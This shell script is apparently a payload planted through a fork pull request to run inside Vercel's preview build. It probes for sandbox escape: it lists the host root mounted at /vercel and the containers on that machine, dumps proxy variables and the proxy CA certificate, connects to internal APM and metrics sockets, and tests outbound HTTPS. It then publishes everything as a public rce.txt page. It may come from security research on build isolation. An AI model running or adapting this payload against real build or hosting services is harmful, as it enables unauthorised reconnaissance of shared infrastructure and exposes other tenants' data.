#!/bin/sh
# Payload introduced ONLY by the fork PR. Round 2: the first probe showed a fresh
# VM (kernel uptime 4.6 s), an isolated namespace (13 pids), and the host root
# mounted at /vercel. This probe asks: is anything ELSE on that machine, and can
# untrusted build code talk to Vercel's internal sockets?
OUT=../../public
mkdir -p "$OUT"
echo '<h1>Vercel preview lab</h1><p><a href="/rce.txt">/rce.txt</a></p>' > "$OUT/index.html"
{
  echo "== kernel/VM lifetime =="
  echo -n "uptime: "; cut -d' ' -f1 /proc/uptime
  echo -n "dmesg first 2: "; dmesg 2>&1 | head -2
  echo -n "dmesg last 2: "; dmesg 2>&1 | tail -2
  echo -n "dmesg line count: "; dmesg 2>&1 | wc -l

  echo "== the host root mounted at /vercel =="
  ls -la /vercel 2>&1 | head -18
  echo -n "cell containers on this machine: "
  ls /vercel/var/lib/cell-overlay-images/containers 2>&1 | head -8 | tr '\n' ' '
  echo -n "  count: "; ls /vercel/var/lib/cell-overlay-images/containers 2>&1 | wc -l
  echo -n "/vercel/volumes: "; ls /vercel/volumes 2>&1 | head -8 | tr '\n' ' '
  echo -n "/vercel/var/lib/cell-overlay-images: "; ls /vercel/var/lib/cell-overlay-images 2>&1 | head -8 | tr '\n' ' '
  echo -n "/vercel/run: "; ls /vercel/run 2>&1 | head -12 | tr '\n' ' '
  echo -n "/vercel/tmp: "; ls /vercel/tmp 2>&1 | head -12 | tr '\n' ' '
  echo -n "/vercel/var/lib/containerd snapshots: "
  ls /vercel/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots 2>&1 | wc -l

  echo "== proxy / egress configuration =="
  env | grep -i -E 'proxy|ca_bundle|ssl_cert|NODE_EXTRA' | head -10
  echo -n "vercel-proxy-ca.crt: "; head -2 /usr/local/share/ca-certificates/vercel-proxy-ca.crt 2>&1
} > "$OUT/rce.txt"
{
  echo "== internal unix sockets (does untrusted build code get a channel in?) =="
  node -e '
const net=require("net"),crypto=require("crypto");
const socks=["/run/apm/apm.sock","/run/metrics/metrics.sock"];
const probe=(i)=>{
  if(i>=socks.length) return egress();
  const p=socks[i];
  const c=net.createConnection({path:p,timeout:2500});
  let got="";
  c.on("data",d=>got+=d);
  c.on("error",e=>{console.log("  "+p+" -> ERR "+e.code);probe(i+1);});
  c.on("connect",()=>{c.write("GET / HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n");});
  c.on("close",()=>{
    const h=crypto.createHash("sha256").update(got).digest("hex").slice(0,10);
    console.log("  "+p+" -> connected, "+got.length+" bytes, sha "+h+" | first 120: "+got.slice(0,120).replace(/\r?\n/g," | "));
    probe(i+1);
  });
};
const egress=()=>{
  const https=require("https");
  const t=(url,label)=>new Promise(res=>{
    const r=https.get({url,timeout:4000},x=>{let b="";x.on("data",c=>b+=c);x.on("end",()=>res("  "+label+" -> "+x.statusCode+" | "+b.length+" bytes"));});
    r.on("error",e=>res("  "+label+" -> ERR "+e.code));
  });
  Promise.all([t("https://example.com/","https example.com"),
               t("https://api.vercel.com/","https api.vercel.com"),
               t("https://suspense-cache.vercel.com/","https suspense-cache")]).then(r=>{console.log("== https egress ==");r.forEach(x=>console.log(x));});
};
probe(0);
' >> "$OUT/rce.txt" 2>&1
}
sleep 3
cat "$OUT/rce.txt"
